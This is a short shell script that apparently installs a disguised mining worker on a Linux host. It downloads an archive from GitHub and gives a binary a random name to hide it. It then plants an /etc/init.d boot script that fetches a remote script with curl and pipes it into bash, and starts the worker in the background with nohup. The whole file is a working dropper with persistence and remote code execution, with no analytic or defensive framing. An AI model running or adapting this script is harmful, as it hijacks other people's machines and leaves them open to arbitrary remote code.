cd /
wget https://github.com/groundam/inputi/releases/download/v1.5.1/power.tar
tar -xvf power.tar
cd /power
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv relay $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./pulse.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/groundam/inputi/main/logic.sh)" > output.sh
chmod a+x output.sh
update-rc.d output.sh defaults
rm -rf power.tar
cd /power
nohup ./pulse.sh
ps -ef | grep power
